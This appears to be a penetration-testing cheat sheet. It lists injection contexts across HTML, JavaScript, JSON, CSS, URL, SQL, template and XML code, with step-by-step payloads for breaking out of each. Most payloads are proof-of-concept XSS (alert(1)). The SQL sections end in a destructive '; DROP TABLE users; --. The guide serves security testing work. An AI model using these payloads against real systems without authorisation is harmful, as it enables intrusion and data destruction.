# Injection Context Structural Requirements

## HTML Contexts

### HTML Body Content
**Context Pattern:**
```html
<div>USER_INPUT</div>
```

**Structural Requirements:**
- **Escape:** Not needed (already in HTML context)
- **Structure:** Valid HTML tags or text
- **Payload:** HTML tags with event handlers or script tags
- **Cleanup:** Close any opened tags

**Progressive Testing:**
```
Step 1: test (baseline text)
Step 2: <img (test tag creation)
Step 3: <img src=x (test attribute)
Step 4: <img src=x onerror= (test event handler)
Step 5: <img src=x onerror=alert(1) (payload)
Step 6: <img src=x onerror=alert(1)> (cleanup)
```

### HTML Attribute Values
**Context Pattern:**
```html
<input value="USER_INPUT">
<img src="USER_INPUT">
```

**Structural Requirements:**
- **Escape:** `"` or `'` (close current attribute)
- **Structure:** Space + new attribute name
- **Payload:** Event handler with JavaScript
- **Cleanup:** `"` or `'` (close your attribute)

**Progressive Testing:**
```
Step 1: test (baseline)
Step 2: " (escape test)
Step 3: " onmouseover= (structure test)
Step 4: " onmouseover="alert(1) (payload test)
Step 5: " onmouseover="alert(1)" (cleanup test)
Step 6: " onmouseover="alert(1)" x=" (advanced cleanup)
```

### HTML Attribute Names
**Context Pattern:**
```html
<div USER_INPUT="value">
```

**Structural Requirements:**
- **Escape:** Space (separate from previous attribute)
- **Structure:** Valid attribute name
- **Payload:** Event handler attribute
- **Cleanup:** `="` + dummy value

**Progressive Testing:**
```
Step 1: test
Step 2: onmouseover
Step 3: onmouseover=
Step 4: onmouseover="alert(1)
Step 5: onmouseover="alert(1)"
```

### HTML Comments
**Context Pattern:**
```html
<!-- USER_INPUT -->
```

**Structural Requirements:**
- **Escape:** `-->` (close comment)
- **Structure:** Valid HTML after comment
- **Payload:** Script tags or event handlers
- **Cleanup:** `<!--` (open new comment)

**Progressive Testing:**
```
Step 1: test
Step 2: -->
Step 3: --><script>
Step 4: --><script>alert(1)
Step 5: --><script>alert(1)</script>
Step 6: --><script>alert(1)</script><!--
```

## JavaScript Contexts

### JavaScript String Literals
**Context Pattern:**
```html
<script>
var data = "USER_INPUT";
</script>
```

**Structural Requirements:**
- **Escape:** `"` or `'` (close string)
- **Structure:** `;` (end statement)
- **Payload:** Valid JavaScript
- **Cleanup:** `;//` or `/**/` (comment out rest)

**Progressive Testing:**
```
Step 1: test
Step 2: "
Step 3: ";
Step 4: ";alert(1)
Step 5: ";alert(1);
Step 6: ";alert(1);//
```

### JavaScript Function Parameters
**Context Pattern:**
```html
<script>
someFunction("USER_INPUT");
</script>
```

**Structural Requirements:**
- **Escape:** `"` (close parameter)
- **Structure:** `)` (close function call)
- **Payload:** `;` + JavaScript
- **Cleanup:** `;//` (comment)

**Progressive Testing:**
```
Step 1: test
Step 2: "
Step 3: ")
Step 4: ");
Step 5: ");alert(1)
Step 6: ");alert(1);//
```

### JavaScript Object Properties
**Context Pattern:**
```html
<script>
var obj = {prop: "USER_INPUT"};
</script>
```

**Structural Requirements:**
- **Escape:** `"` (close property value)
- **Structure:** `}` (close object)
- **Payload:** `;` + JavaScript
- **Cleanup:** `;//` (comment)

**Progressive Testing:**
```
Step 1: test
Step 2: "
Step 3: "}
Step 4: "};
Step 5: "};alert(1)
Step 6: "};alert(1);//
```

### JavaScript Comments
**Context Pattern:**
```html
<script>
// USER_INPUT
var x = 1;
</script>
```

**Structural Requirements:**
- **Escape:** `\n` or `\r` (newline)
- **Structure:** Valid JavaScript line
- **Payload:** JavaScript code
- **Cleanup:** `//` (new comment)

**Progressive Testing:**
```
Step 1: test
Step 2: \n
Step 3: \nalert(1)
Step 4: \nalert(1);//
```

## JSON Contexts

### JSON String Values
**Context Pattern:**
```html
<script>
var config = {"name": "USER_INPUT"};
</script>
```

**Structural Requirements:**
- **Escape:** `"` (close string value)
- **Structure:** `,` (property separator)
- **Payload:** `"prop":"value"` (new property)
- **Cleanup:** `};//` (close object + comment)

**Progressive Testing:**
```
Step 1: test
Step 2: "
Step 3: ",
Step 4: ","newprop":
Step 5: ","newprop":"value"
Step 6: ","newprop":"value"}
Step 7: ","newprop":"value"};//
```

### JSON Object Properties
**Context Pattern:**
```html
<script>
var config = {USER_INPUT: "value"};
</script>
```

**Structural Requirements:**
- **Escape:** Not needed (already property name)
- **Structure:** `:` + property value
- **Payload:** Valid JSON value or break structure
- **Cleanup:** `,` or `}` depending on approach

### JSON Array Elements
**Context Pattern:**
```html
<script>
var arr = ["item1", "USER_INPUT", "item3"];
</script>
```

**Structural Requirements:**
- **Escape:** `"` (close string element)
- **Structure:** `]` (close array)
- **Payload:** `;` + JavaScript
- **Cleanup:** `;//` (comment)

**Progressive Testing:**
```
Step 1: test
Step 2: "
Step 3: "]
Step 4: "];
Step 5: "];alert(1)
Step 6: "];alert(1);//
```

## CSS Contexts

### CSS Property Values
**Context Pattern:**
```html
<div style="color: USER_INPUT">
```

**Structural Requirements:**
- **Escape:** Not always needed
- **Structure:** `;` (end property)
- **Payload:** New CSS property or CSS function
- **Cleanup:** `;` (end your property)

**Progressive Testing:**
```
Step 1: red
Step 2: red;
Step 3: red;background:
Step 4: red;background:url(javascript:alert(1))
Step 5: red;background:url(javascript:alert(1));
```

### CSS Style Blocks
**Context Pattern:**
```html
<style>
.class { color: USER_INPUT; }
</style>
```

**Structural Requirements:**
- **Escape:** Not needed initially
- **Structure:** `}` (close current rule)
- **Payload:** New CSS rule
- **Cleanup:** Close any opened rules

**Progressive Testing:**
```
Step 1: red
Step 2: red;}
Step 3: red;}body{
Step 4: red;}body{background:url(javascript:alert(1))
Step 5: red;}body{background:url(javascript:alert(1))}
```

## URL/Protocol Contexts

### href Attributes
**Context Pattern:**
```html
<a href="USER_INPUT">
```

**Structural Requirements:**
- **Escape:** Not needed (URL context)
- **Structure:** Valid URL scheme
- **Payload:** `javascript:` protocol
- **Cleanup:** Not typically needed

**Progressive Testing:**
```
Step 1: http://test.com
Step 2: javascript:
Step 3: javascript:alert(1)
Step 4: javascript:alert(1);//
```

### src Attributes  
**Context Pattern:**
```html
<img src="USER_INPUT">
<script src="USER_INPUT">
```

**Structural Requirements:**
- **Escape:** `"` (if breaking out of attribute)
- **Structure:** Space + new attribute
- **Payload:** Event handler
- **Cleanup:** `"` (close attribute)

**Progressive Testing:**
```
Step 1: http://test.com/image.jpg
Step 2: " 
Step 3: " onerror="
Step 4: " onerror="alert(1)
Step 5: " onerror="alert(1)"
```

## SQL Contexts

### SQL String Literals
**Context Pattern:**
```sql
SELECT * FROM users WHERE name = 'USER_INPUT'
```

**Structural Requirements:**
- **Escape:** `'` (close string)
- **Structure:** `;` or SQL operator
- **Payload:** SQL injection payload
- **Cleanup:** `--` or `/**/` (comment)

**Progressive Testing:**
```
Step 1: test
Step 2: '
Step 3: ';
Step 4: '; DROP TABLE users;
Step 5: '; DROP TABLE users; --
```

### SQL Numeric Contexts
**Context Pattern:**
```sql
SELECT * FROM users WHERE id = USER_INPUT
```

**Structural Requirements:**
- **Escape:** Not needed (numeric context)
- **Structure:** SQL operator or `;`
- **Payload:** SQL injection
- **Cleanup:** `--` (comment)

**Progressive Testing:**
```
Step 1: 123
Step 2: 123;
Step 3: 123; DROP TABLE users;
Step 4: 123; DROP TABLE users; --
```

## Template Engine Contexts

### Server-Side Templates (Jinja2, Twig, etc.)
**Context Pattern:**
```
Hello {{USER_INPUT}}!
```

**Structural Requirements:**
- **Escape:** `}}` (close template expression)
- **Structure:** `{{` (open new expression)
- **Payload:** Template injection payload
- **Cleanup:** `}}` (close expression)

**Progressive Testing:**
```
Step 1: test
Step 2: }}
Step 3: }}{{
Step 4: }}{{7*7}}
Step 5: }}{{7*7}}{{
```

### Client-Side Templates (Angular, Vue)
**Context Pattern:**
```html
<div>{{USER_INPUT}}</div>
```

**Structural Requirements:**
- **Escape:** `}}` (close expression)
- **Structure:** Valid HTML or new template expression
- **Payload:** Template injection or XSS
- **Cleanup:** Depends on template engine

## XML/SOAP Contexts

### XML CDATA
**Context Pattern:**
```xml
<data><![CDATA[USER_INPUT]]></data>
```

**Structural Requirements:**
- **Escape:** `]]>` (close CDATA)
- **Structure:** Valid XML
- **Payload:** XML injection or XXE
- **Cleanup:** `<![CDATA[` (new CDATA)

### XML Attributes
**Context Pattern:**
```xml
<element attr="USER_INPUT">
```

**Structural Requirements:**
- **Escape:** `"` (close attribute)
- **Structure:** Space + new attribute
- **Payload:** New attribute or close tag
- **Cleanup:** `"` (close attribute)

## Key Principles

1. **Always test structural components separately first**
2. **Verify each escape mechanism works before adding payload**
3. **Use progressive complexity in your testing**
4. **Understand the parsing rules of each context**
5. **Test cleanup mechanisms to prevent syntax errors**
6. **Consider encoding variations for each context**

## Context Detection Strategy

1. **Inject unique markers** (`TESTXSS123`) to trace data flow
2. **View page source** to see exact injection context
3. **Test minimal escape sequences** before full payloads
4. **Use browser developer tools** to inspect DOM changes
5. **Test different browsers** as parsing may vary
